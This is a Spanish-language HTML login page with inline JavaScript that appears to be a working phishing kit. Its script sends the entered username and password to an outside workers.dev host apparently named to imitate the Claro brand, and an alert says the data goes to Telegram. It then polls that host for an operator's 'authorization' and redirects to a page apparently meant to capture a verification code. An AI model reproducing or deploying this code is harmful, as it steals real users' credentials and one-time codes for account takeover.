<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
</head>
<body>
  <h2>Formulario de Acceso</h2>
  <form id="loginForm">
    <label>Usuario:</label>
    <input type="text" id="usuario" required><br><br>

    <label>Clave:</label>
    <input type="password" id="clave" required><br><br>

    <button type="submit">Enviar</button>
  </form>

  <div id="espera" style="display:none;">
    <h2>Ingresando...</h2>
    <p id="status">Esperando autorización...</p>
  </div>

  <script>
    const loginForm = document.getElementById("loginForm");
    const esperaDiv = document.getElementById("espera");
    const statusEl = document.getElementById("status");

    loginForm.addEventListener("submit", async (e) => {
      e.preventDefault();

      const usuario = document.getElementById("usuario").value;
      const clave = document.getElementById("clave").value;

      try {
        const res = await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ usuario, clave })
        });

        const data = await res.json();
        if(data.ok){
          alert("✅ Enviado a Telegram, esperando autorización...");
          loginForm.style.display = "none";
          esperaDiv.style.display = "block";

          const userId = data.id;

          // Polling cada 3 segundos para verificar autorización
          const interval = setInterval(async () => {
            try {
              const statusRes = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${userId}`);
              const statusData = await statusRes.json();
              if(statusData.autorizado){
                clearInterval(interval);
                window.location.href = "codigo.html"; // Redirige al código
              }
            } catch(err){
              console.error(err);
              statusEl.textContent = "Error al conectar al servidor.";
            }
          }, 3000);

        } else {
          alert("❌ Error: " + data.error);
        }

      } catch(err){
        alert("❌ Error al enviar datos: " + err.message);
      }
    });
  </script>
</body>
</html>
